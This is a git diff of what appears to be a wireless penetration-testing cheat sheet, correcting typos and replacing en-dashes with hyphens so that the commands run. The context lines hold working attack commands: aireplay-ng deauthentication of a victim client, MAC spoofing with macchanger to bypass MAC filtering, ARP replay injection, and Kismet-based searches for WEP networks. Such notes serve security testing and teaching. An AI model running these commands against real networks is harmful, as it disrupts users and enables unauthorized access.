@@ -31,7 +31,7 @@ airodump-ng -c 3 --bssid $AP_MAC $HOST:$PORT
 
 ### Wireless Intrusion Detection System
 
-> Require wireless key and bssid
+> Requires wireless key and bssid
 
 ```powershell
 airmon-ng start wlan0 3
@@ -78,7 +78,7 @@ Kismet > Add source > wlan0 > Add
 
 ```powershell
 # giskismet: kismet inside a SQL database
-> require a GPS receiver
+> requires a GPS receiver
 
 gpsd -n -N -D4 /dev/ttyUSB0
 -N : foreground 
@@ -96,14 +96,14 @@ giskismet -q "select * from wireless where Encryption='WEP'" -o wepaps.kml
 
 ```powershell
 # Find Hidden SSID
-aireplay-ng -0 20 –a <BSSID> -c <VictimMac> mon0
+aireplay-ng -0 20 -a <BSSID> -c <VictimMac> mon0
 
 # Mac Filtering
-macchanger –-mac <VictimMac> wlan0mon
-aireplay-ng -3 –b <BSSID> -h <FakedMac> wlan0mon
+macchanger --mac <VictimMac> wlan0mon
+aireplay-ng -3 -b <BSSID> -h <FakedMac> wlan0mon
 # MAC CHANGER
 ifconfig wlan0mon down
-macchanger –-mac <macVictima> wlan0mon
+macchanger --mac <macVictima> wlan0mon
 ifconfig wlan0mon up
 
 # Deauth Global
